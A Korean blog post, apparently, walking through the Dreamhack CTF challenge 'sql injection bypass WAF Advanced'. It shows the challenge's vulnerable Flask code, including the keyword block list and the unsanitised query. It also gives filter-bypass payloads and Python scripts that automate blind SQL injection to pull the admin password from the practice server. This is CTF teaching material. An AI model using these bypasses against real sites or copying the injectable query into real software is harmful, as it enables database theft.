---
layout: post
title: Dreamhack | sql injection bypass WAF Advanced
subtitle: sql injection bypass WAF Advanced 문제 풀이
categories: Web
tags: [dreamhack, Pentest, Web]
---

**본 문제는 dreamhack.io를 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/17da246e-e12d-4885-806c-6147188bd1d8" width = 850>
</p>

**Web Application Firewall**을 우회하여 SQL Injection을 시도해야하는 문제라 설명이 있다.

### 문제 풀이

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/77f0bd1b-1311-4d9a-a6ff-6144d50574cc" width = 850>
</p>

접속하면 기본 SQL 문법이 나오며 `uid`에 대한 입력이 가능하다.

```sql
USE `users`;
CREATE TABLE user(
  idx int auto_increment primary key,
  uid varchar(128) not null,
  upw varchar(128) not null
);

INSERT INTO user(uid, upw) values('abcde', '12345');
INSERT INTO user(uid, upw) values('admin', 'DH{**FLAG**}');
INSERT INTO user(uid, upw) values('guest', 'guest');
INSERT INTO user(uid, upw) values('test', 'test');
INSERT INTO user(uid, upw) values('dream', 'hack');
FLUSH PRIVILEGES;
```

현재 데이터베이스에는 위와 같이 5개의 값이 들어가 있으며 `admin`에 대한 upw가 FLAG임을 알 수 있다.

#### app.py

```python
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False


@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template
```

* `uid` 입력 값이 `keywords` 리스트에 포함된 경우 WAF에 의해 차단되었다는 결과를 출력한다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/b55da384-b3a5-443c-9bf5-e2e97a831a3a" width = 850>
</p>

* keywords에 포함된 값이 아닌 데이터베이스의 값을 넣게 되면 와일드카드 `*`에 의해 모든 값을 출력할 것으로 보이지만 `result = cur.fetchone()`에 의해 `uid`하나의 값만 출력된다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/7654660a-c4d4-42d1-8c21-60f8d0840941" width = 850>
</p>

현재 필터링 되고 있는 값으로 인해 서브쿼리를 생성하는데에는 불가능하고 공백 필터링, 연산자 필터링, 주석 필터링이 되고 있는 것을 알 수 있다.

> 필터링 우회에 대한 방법으로는 **참고 : [끄적끄적](https://g-idler.tistory.com/61)**

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/ea2526ed-8e03-409b-9ca2-8679f0d56a0b" width = 850>
</p>

* SQL 문법을 조작하여 참이 되게 만들면 제일 먼저 삽입되어 있는 **abcde**의 첫 값이 출력되고

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/40dcb241-84ea-4c65-be61-fe42957cb94d" width = 850>
</p>

* SQL을 값을 거짓으로 만들면 어떠한 값도 출력되지 않는 것을 알 수 있다.

이를 이용하며 `Blind SQL Injection`을 시도하면 된다.

#### Length Password

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/4e42554c-0f1d-49ae-9c0a-a744397dccf1" width = 850>
</p>

* `'||length(upw)like"5";%00`

패스워드의 길이가 5인 것을 출력하면 총 4개의 데이터가 있지만 `fetchone`을 통해 하나만 출력된다.

`like"4"`로 변경하여 조회하면 `test`가 출력된다.

그렇다면 플래그의 값을 조회하기 위해 패스워드 길이를 늘려가며 참이 되는 경우를 확인하면 된다.

```python
url = 'http://host3.dreamhack.games:18327/'

def len_pw():
    i = 6
    while True:
        payload = f"'||length(upw)like\"{i}\";%00"
        param = {'uid' : payload}
        r = requests.get(url, params = param)

        if r.text.__contains__('admin'):
            print(f'[+] Password length = {i}')
            break
        else:
            i += 1
```

#### Password

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/6f31aff1-a1f4-4129-85f1-c7e863170fd8" width = 850>
</p>

* admin의 `upw` 첫 문자는 **D**로 아스키 값이 68

* 출력되는 값이 `admin`일 때만 참인 것으로 판단

* 패스워드 길이만큼 아스키 값 비교

```python
def find_pw(len):
    global pw
    for i in (range(1, len + 1)):
        for j in (range(32, 127 + 1)):
            payload = f"'||(ascii(substr(upw,{i},1)))like({j});%00"
            param = {'uid' : payload}
            r = requests.get(url, params = param)

            if r.text.__contains__('admin'):
                pw += chr(j)           
                break
    
    print(f'[+] Password = {pw}')
```